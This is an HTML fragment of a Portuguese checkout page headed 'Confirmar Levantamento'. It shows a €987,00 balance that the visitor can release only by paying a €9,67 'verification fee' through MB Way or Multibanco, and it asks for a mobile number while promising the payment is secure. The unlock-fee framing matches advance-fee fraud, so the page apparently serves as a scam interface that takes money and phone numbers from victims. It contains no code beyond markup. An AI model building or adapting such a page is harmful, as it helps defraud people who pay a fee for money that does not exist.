<body>
  <div class="checkout-page">
    <div class="checkout-content">
      <div class="checkout-header">
        <a href="#" class="back-btn" onclick="window.history.back(); return false;">
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"></path></svg>
        </a>
        <h1>Confirmar Levantamento</h1>
      </div>
      
      <div class="checkout-summary">
        <div class="summary-item">
          <span>Saldo disponível:</span>
          <strong>€987,00</strong>
        </div>
        <div class="summary-item">
          <span>Taxa de verificação:</span>
          <strong>€9,67</strong>
        </div>
        <div class="summary-item total">
          <span>Total a pagar:</span>
          <strong>€9,67</strong>
        </div>
      </div>
      
      <form class="checkout-form" id="checkout-form">
        <div class="form-section">
          <h3>Método de Pagamento</h3>
          
          <div class="payment-method-options">
            <label class="payment-method-option">
              <input type="radio" name="payment-method" value="mbway" checked="">
              <div class="method-card">
                <img src="images/mbway-logo.png" alt="MB Way" class="method-logo-small">
                <span>MB Way</span>
              </div>
            </label>
            
            <label class="payment-method-option">
              <input type="radio" name="payment-method" value="multibanco">
              <div class="method-card">
                <img src="images/multibanco-logo.png" alt="Multibanco" class="method-logo-small">
                <span>Multibanco</span>
              </div>
            </label>
          </div>
        </div>
        
        <div class="form-section" id="phone-section" style="display: block;">
          <h3>Telefone MB Way</h3>
          
          <div class="form-group">
            <label for="payer-phone">Número de Telemóvel</label>
            <div class="phone-input-wrapper">
              <div class="country-code">
                <span class="flag">🇵🇹</span>
                <span class="code">+351</span>
              </div>
              <input type="tel" id="payer-phone" name="phone" placeholder="912345678" maxlength="9" pattern="[0-9]*" inputmode="numeric" autocomplete="off" value="" required="">
            </div>
          </div>
        </div>
        
        <div id="mbway-submit-section">
          <button type="submit" class="checkout-submit-btn" id="checkout-submit-btn">
            Pagar €9,67
          </button>
        </div>
        
        <div class="checkout-info">
          <p>🔒 O teu pagamento é seguro e protegido</p>
          <p>💰 Taxa de verificação para libertar os €987,00 do teu saldo</p>
        </div>
      </form>
    </div>
  </div>
